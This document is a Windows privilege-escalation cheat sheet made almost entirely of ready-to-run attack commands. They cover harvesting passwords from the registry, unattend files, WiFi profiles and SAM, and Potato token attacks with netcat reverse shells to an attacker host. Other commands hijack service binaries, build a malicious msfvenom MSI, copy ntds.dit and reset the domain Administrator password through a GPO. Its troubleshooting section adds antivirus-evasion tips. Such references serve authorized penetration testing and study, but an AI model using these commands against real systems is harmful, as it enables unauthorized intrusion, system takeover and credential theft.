# Windows Privilege Escalation Reference

## System Enumeration

```powershell
# OS version and patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe
wmic os get osarchitecture

# User enumeration
whoami && whoami /priv && whoami /groups && whoami /all
net user && net localgroup administrators
Get-LocalUser | ft Name,Enabled,LastLogon
Get-LocalGroupMember Administrators | ft Name,PrincipalSource

# Network enumeration
ipconfig /all && route print && arp -A && netstat -ano
net share && nltest /DCLIST:DomainName

# Environment
set
Get-ChildItem Env: | ft Key,Value

# Antivirus
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

## Automated Enumeration Tools

| Tool | Command | Purpose |
|------|---------|---------|
| WinPEAS | `winPEAS.exe` | Comprehensive enumeration |
| PowerUp | `Invoke-AllChecks` | Service/path vulnerabilities |
| Seatbelt | `Seatbelt.exe -group=all` | Security audit checks |
| Watson | `Watson.exe` | Missing patches |
| PrivescCheck | `Invoke-PrivescCheck` | Privilege escalation checks |

## Credential Harvesting

### Search for Passwords
```powershell
# File contents
findstr /SI /M "password" *.xml *.ini *.txt *.config

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# PuTTY / VNC
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Specific files
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
```

### Unattend.xml Credentials
```powershell
# Common locations
dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul
# C:\Windows\Panther\Unattend.xml
# C:\Windows\system32\sysprep\sysprep.xml
```

### WiFi Passwords
```powershell
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

### PowerShell History
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### SAM/SYSTEM Extraction
```powershell
# Locations: %SYSTEMROOT%\System32\config\SAM, SYSTEM, RegBack\
# HiveNightmare (CVE-2021-36934)
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX)
```

### Stored Credentials
```powershell
cmdkey /list
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

## Token Impersonation

### Check Impersonation Privileges
```powershell
whoami /priv

# Exploitable privileges:
# SeImpersonatePrivilege       - Potato attacks
# SeAssignPrimaryTokenPrivilege - Potato attacks
# SeBackupPrivilege            - Read protected files
# SeRestorePrivilege           - Write protected files
# SeTakeOwnershipPrivilege     - Take file ownership
# SeDebugPrivilege             - Debug processes
# SeLoadDriverPrivilege        - Load vulnerable drivers
```

### Potato Attacks

| Tool | Target OS | Command |
|------|-----------|---------|
| JuicyPotato | Server 2019 and below | `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c nc.exe IP PORT -e cmd.exe" -t *` |
| PrintSpoofer | Win10/Server 2019 | `PrintSpoofer.exe -i -c cmd` |
| RoguePotato | Various | `RoguePotato.exe -r IP -e "nc.exe IP PORT -e cmd.exe" -l 9999` |
| GodPotato | Various | `GodPotato.exe -cmd "cmd /c whoami"` |
| SweetPotato | Various | `execute-assembly sweetpotato.exe -p beacon.exe` |

### Privilege Exploit Reference

| Privilege | Tool | Usage |
|-----------|------|-------|
| SeImpersonatePrivilege | JuicyPotato/PrintSpoofer | CLSID/Spooler abuse |
| SeBackupPrivilege | robocopy /b | Read protected files |
| SeRestorePrivilege | Enable-SeRestorePrivilege | Write protected files |
| SeTakeOwnershipPrivilege | takeown.exe | Take file ownership |
| SeLoadDriverPrivilege | Capcom driver | Load vuln driver + exploit |

## Service Exploitation

### Incorrect Service Permissions
```powershell
# Find misconfigured services
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula
# Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG

# Exploit
sc config <service> binpath= "C:\nc.exe -e cmd.exe IP PORT"
sc stop <service> && sc start <service>
```

### Unquoted Service Paths
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"
# For path: C:\Program Files\Some App\service.exe
# Try: C:\Program.exe or C:\Program Files\Some.exe
```

### AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must return 0x1

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o evil.msi
msiexec /quiet /qn /i C:\evil.msi
```

### Service Abuse with PowerUp
```powershell
. .\PowerUp.ps1
Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

## DLL Hijacking

```powershell
# Find missing DLLs with Process Monitor
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Compile malicious DLL
# x64: x86_64-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
# x86: i686-w64-mingw32-gcc windows_dll.c -shared -o evil.dll
```

## Kernel Exploitation

```powershell
# Windows Exploit Suggester
systeminfo > systeminfo.txt
python wes.py systeminfo.txt

# Watson (on target)
Watson.exe
```

### Common Kernel Exploits
```
MS17-010 (EternalBlue)   - Windows 7/2008/2003/XP
MS16-032                 - 2008/7/8/10/2012
MS15-051                 - 2003/2008/7
CVE-2021-1732            - Windows 10/Server 2019
CVE-2020-0796 (SMBGhost) - Windows 10
CVE-2019-1388            - Windows 7/8/10/2008-2019
```

## WSL Exploitation

```powershell
wsl whoami
wsl --default-user root
wsl python -c 'import os; os.system("/bin/bash")'
```

## SeBackupPrivilege Exploitation

```powershell
import-module .\SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
```

## GPO Abuse

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
  --Author DOMAIN\<USER> --Command "cmd.exe" `
  --Arguments "/c net user Administrator Password!@# /domain" `
  --GPOName "ADDITIONAL DC CONFIGURATION"
```

## Default Writable Folders
```
C:\Windows\Temp
C:\Windows\Tasks
C:\Users\Public
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
```

## Quick Reference

| Vector | Check Command |
|--------|---------------|
| Unquoted paths | `wmic service get pathname \| findstr /i /v """` |
| Weak service perms | `accesschk.exe -uwcqv "Everyone" *` |
| AlwaysInstallElevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
| Stored credentials | `cmdkey /list` |
| Token privileges | `whoami /priv` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |

## Troubleshooting

| Issue | Solution |
|-------|----------|
| AV blocks exploit | Use obfuscated/custom binaries; LOLBAS techniques |
| Service won't start | Ensure space after `=` in binpath: `binpath= "C:\path"` |
| Token impersonation fails | Check `whoami /priv`; verify Windows version |
| PowerShell blocked | `powershell -ep bypass` or `-enc <base64>` |
| Can't find kernel exploit | Run `python wes.py systeminfo.txt` |
